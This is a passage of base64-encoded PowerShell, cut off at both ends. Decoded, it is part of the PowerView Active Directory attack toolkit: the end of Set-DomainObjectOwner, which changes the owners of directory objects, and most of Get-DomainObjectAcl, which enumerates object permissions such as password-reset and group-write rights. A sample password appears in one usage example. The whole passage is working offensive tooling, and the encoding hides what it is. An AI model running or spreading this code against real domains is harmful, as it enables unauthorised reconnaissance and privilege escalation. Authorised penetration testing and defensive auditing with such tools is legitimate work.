ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAkT3duZXJTaWQgPSBHZXQtRG9tYWluT2JqZWN0IEBTZWFyY2hlckFyZ3VtZW50cyAtSWRlbnRpdHkgJE93bmVySWRlbnRpdHkgLVByb3BlcnRpZXMgb2JqZWN0c2lkIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgb2JqZWN0c2lkCiAgICAgICAgaWYgKCRPd25lclNpZCkgewogICAgICAgICAgICAkT3duZXJJZGVudGl0eVJlZmVyZW5jZSA9IFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcl0kT3duZXJTaWQKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltTZXQtRG9tYWluT2JqZWN0T3duZXJdIEVycm9yIHBhcnNpbmcgb3duZXIgaWRlbnRpdHkgJyRPd25lcklkZW50aXR5JyIKICAgICAgICB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRPd25lcklkZW50aXR5UmVmZXJlbmNlKSB7CiAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snUmF3J10gPSAkVHJ1ZQogICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkSWRlbnRpdHkKCiAgICAgICAgICAgICMgc3BsYXQgdGhlIGFwcHJvcHJpYXRlIGFyZ3VtZW50cyB0byBHZXQtRG9tYWluT2JqZWN0CiAgICAgICAgICAgICRSYXdPYmplY3QgPSBHZXQtRG9tYWluT2JqZWN0IEBTZWFyY2hlckFyZ3VtZW50cwoKICAgICAgICAgICAgRm9yRWFjaCAoJE9iamVjdCBpbiAkUmF3T2JqZWN0KSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltTZXQtRG9tYWluT2JqZWN0T3duZXJdIEF0dGVtcHRpbmcgdG8gc2V0IHRoZSBvd25lciBmb3IgJyRJZGVudGl0eScgdG8gJyRPd25lcklkZW50aXR5JyIKICAgICAgICAgICAgICAgICAgICAkRW50cnkgPSAkUmF3T2JqZWN0LkdldERpcmVjdG9yeUVudHJ5KCkKICAgICAgICAgICAgICAgICAgICAkRW50cnkuUHNCYXNlLk9iamVjdFNlY3VyaXR5LlNldE93bmVyKCRPd25lcklkZW50aXR5UmVmZXJlbmNlKQogICAgICAgICAgICAgICAgICAgICRFbnRyeS5Qc0Jhc2UuQ29tbWl0Q2hhbmdlcygpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW1NldC1Eb21haW5PYmplY3RPd25lcl0gRXJyb3Igc2V0dGluZyBvd25lcjogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRG9tYWluT2JqZWN0QWNsIHsKPCMKLlNZTk9QU0lTCgpSZXR1cm5zIHRoZSBBQ0xzIGFzc29jaWF0ZWQgd2l0aCBhIHNwZWNpZmljIGFjdGl2ZSBkaXJlY3Rvcnkgb2JqZWN0LgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluU2VhcmNoZXIsIEdldC1Eb21haW5HVUlETWFwICAKCi5QQVJBTUVURVIgSWRlbnRpdHkKCkEgU2FtQWNjb3VudE5hbWUgKGUuZy4gaGFybWoweSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIENOPWhhcm1qMHksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksClNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgpLCBvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMSkuCldpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgUmVzb2x2ZUdVSURzCgpTd2l0Y2guIFJlc29sdmUgR1VJRHMgdG8gdGhlaXIgZGlzcGxheSBuYW1lcy4KCi5QQVJBTUVURVIgUmlnaHRzRmlsdGVyCgpBIHNwZWNpZmljIHNldCBvZiByaWdodHMgdG8gcmV0dXJuICgnQWxsJywgJ1Jlc2V0UGFzc3dvcmQnLCAnV3JpdGVNZW1iZXJzJykuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIGZvciB0aGUgcXVlcnksIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBmaWx0ZXIgQWN0aXZlIERpcmVjdG9yeSBvYmplY3RzLgoKLlBBUkFNRVRFUiBTZWFyY2hCYXNlCgpUaGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2gsIGUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIKVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluT2JqZWN0QWNsIC1JZGVudGl0eSBtYXR0LmFkbWluIC1kb21haW4gdGVzdGxhYi5sb2NhbCAtUmVzb2x2ZUdVSURzCgpHZXQgdGhlIEFDTHMgZm9yIHRoZSBtYXR0LmFkbWluIHVzZXIgaW4gdGhlIHRlc3RsYWIubG9jYWwgZG9tYWluIGFuZApyZXNvbHZlIHJlbGV2YW50IEdVSURzIHRvIHRoZWlyIGRpc3BsYXkgbmFtZXMuCgouRVhBTVBMRQoKR2V0LURvbWFpbk9VIHwgR2V0LURvbWFpbk9iamVjdEFjbCAtUmVzb2x2ZUdVSURzCgpFbnVtZXJhdGUgdGhlIEFDTCBwZXJtaXNzaW9ucyBmb3IgYWxsIE9VcyBpbiB0aGUgZG9tYWluLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5PYmplY3RBY2wgLUNyZWRlbnRpYWwgJENyZWQgLVJlc29sdmVHVUlEcwoKLk9VVFBVVFMKClBvd2VyVmlldy5BQ0wKCkN1c3RvbSBQU09iamVjdCB3aXRoIEFDTCBlbnRyaWVzLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkFDTCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSZXNvbHZlR1VJRHMsCgogICAgICAgIFtTdHJpbmddCiAgICAgICAgW0FsaWFzKCdSaWdodHMnKV0KICAgICAgICBbVmFsaWRhdGVTZXQoJ0FsbCcsICdSZXNldFBhc3N3b3JkJywgJ1dyaXRlTWVtYmVycycpXQogICAgICAgICRSaWdodHNGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnU2VjdXJpdHlNYXNrcycgPSAnRGFjbCcKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ3NhbWFjY291bnRuYW1lLG50c2VjdXJpdHlkZXNjcmlwdG9yLGRpc3Rpbmd1aXNoZWRuYW1lLG9iamVjdHNpZCcKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCgogICAgICAgICREb21haW5HVUlETWFwQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJERvbWFpbkdVSURNYXBBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJERvbWFpbkdVSURNYXBBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkRG9tYWluR1VJRE1hcEFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJERvbWFpbkdVSURNYXBBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICREb21haW5HVUlETWFwQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgICMgZ2V0IGEgR1VJRCAtPiBuYW1lIG1hcHBpbmcKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXNvbHZlR1VJRHMnXSkgewogICAgICAgICAgICAkR1VJRHMgPSBHZXQtRG9tYWluR1VJRE1hcCBARG9tYWluR1VJRE1hcEFyZ3VtZW50cwogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFNlYXJjaGVyKSB7CiAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICRGaWx0ZXIgPSAnJwogICAgICAgICAgICAkSWRlbnRpdHkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8uUmVwbGFjZSgnKCcsICdcMjgnKS5SZXBsYWNlKCcpJywgJ1wyOScpCiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeUy0xLS4qJykgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG9iamVjdHNpZD0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnXihDTnxPVXxEQyk9LionKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgJEd1aWRCeXRlU3RyaW5nID0gKC1Kb2luICgoW0d1aWRdJElkZW50aXR5SW5zdGFuY2UpLlRvQnl0ZUFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCB7JF8uVG9TdHJpbmcoJ1gnKS5QYWRMZWZ0KDIsJzAnKX0pKSAtUmVwbGFjZSAnKC4uKScsJ1wkMScKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0Z3VpZD0kR3VpZEJ5dGVTdHJpbmcpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkSWRlbnRpdHlJbnN0YW5jZS5Db250YWlucygnLicpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIih8KHNhbUFjY291bnROYW1lPSRJZGVudGl0eUluc3RhbmNlKShuYW1lPSRJZGVudGl0eUluc3RhbmNlKShkbnNob3N0bmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkpIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIofChzYW1BY2NvdW50TmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkobmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkoZGlzcGxheW5hbWU9JElkZW50aXR5SW5zdGFuY2UpKSIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJElkZW50aXR5RmlsdGVyIC1hbmQgKCRJZGVudGl0eUZpbHRlci5UcmltKCkgLW5lICcnKSApIHsKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIih8JElkZW50aXR5RmlsdGVyKSIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbk9iamVjdEFjbF0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXIiCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIkTERBUEZpbHRlciIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKCRGaWx0ZXIpIHsKICAgICAgICAgICAgICAgICRTZWFyY2hlci5maWx0ZXIgPSAiKCYkRmlsdGVyKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbk9iamVjdEFjbF0gR2V0LURvbWFpbk9iamVjdEFjbCBmaWx0ZXIgc3RyaW5nOiAkKCRTZWFyY2hlci5maWx0ZXIpIgoKICAgICAgICAgICAgJFJlc3VsdHMgPSAkU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkT2JqZWN0ID0gJF8uUHJvcGVydGllcwoKICAgICAgICAgICAgICAgIGlmICgkT2JqZWN0Lm9iamVjdHNpZCAtYW5kICRPYmplY3Qub2JqZWN0c2lkWzBdKSB7CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFNpZCA9IChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCRPYmplY3Qub2JqZWN0c2lkWzBdLDApKS5WYWx1ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFNpZCA9ICROdWxsCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBOZXctT2JqZWN0IFNlY3VyaXR5LkFjY2Vzc0NvbnRyb2wuUmF3U2VjdXJpdHlEZXNjcmlwdG9yIC1Bcmd1bWVudExpc3QgJE9iamVjdFsnbnRzZWN1cml0eWRlc2NyaXB0b3InXVswXSwgMCB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZCBEaXNjcmV0aW9uYXJ5QWNsIHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmlnaHRzRmlsdGVyJ10pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHdWlkRmlsdGVyID0gU3dpdGNoICgkUmlnaHRzRmlsdGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1Jlc2V0UGFzc3dvcmQnIHsgJzAwMjk5NTcwLTI0NmQtMTFkMC1hNzY4LTAwYWEwMDZlMDUyOScgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdXcml0ZU1lbWJlcnMnIHsgJ2JmOTY3OWMwLTBkZTYtMTFkMC1hMjg1LTAwYWEwMDMwNDllMicgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlZmF1bHQgeyAnMDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAwJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJF8uT2JqZWN0VHlwZSAtZXEgJEd1aWRGaWx0ZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXyB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdPYmplY3RETicgJE9iamVjdC5kaXN0aW5ndWlzaGVkbmFtZVswXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ09iamVjdFNJRCcgJE9iamVjdFNpZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXyB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdPYmplY3RETicgJE9iamVjdC5kaXN0aW5ndWlzaGVkbmFtZVswXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8gfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnT2JqZWN0U0lEJyAkT2JqZWN0U2lkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQ29udGludWUgPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJENvbnRpbnVlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXyB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdBY3RpdmVEaXJlY3RvcnlSaWdodHMnIChbRW51bV06OlRvT2JqZWN0KFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5UmlnaHRzXSwgJF8uQWNjZXNzTWFzaykpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRHVUlEcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgd2UncmUgcmVzb2x2aW5nIEdVSURzLCBtYXAgdGhlbSB0aGVtIHRvIHRoZSByZXNvbHZlZCBoYXNoIHRhYmxlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFjbFByb3BlcnRpZXMgPSBAe30KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXy5wc29iamVjdC5wcm9wZXJ0aWVzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJF8uTmFtZSAtbWF0Y2ggJ09iamVjdFR5cGV8SW5oZXJpdGVkT2JqZWN0VHlwZXxPYmplY3RBY2VUeXBlfEluaGVyaXRlZE9iamVjdEFjZVR5cGUnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBY2xQcm9wZXJ0aWVzWyRfLk5hbWVdID0gJEdVSURzWyRfLlZhbHVlLnRvU3RyaW5nKCldCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFjbFByb3BlcnRpZXNbJF8uTmFtZV0gPSAkXy5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFjbFByb3BlcnRpZXNbJF8uTmFtZV0gPSAkXy5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPdXRPYmplY3QgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgJEFjbFByb3BlcnRpZXMKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT3V0T2JqZWN0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5BQ0wnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPdXRPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5BQ0wnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBj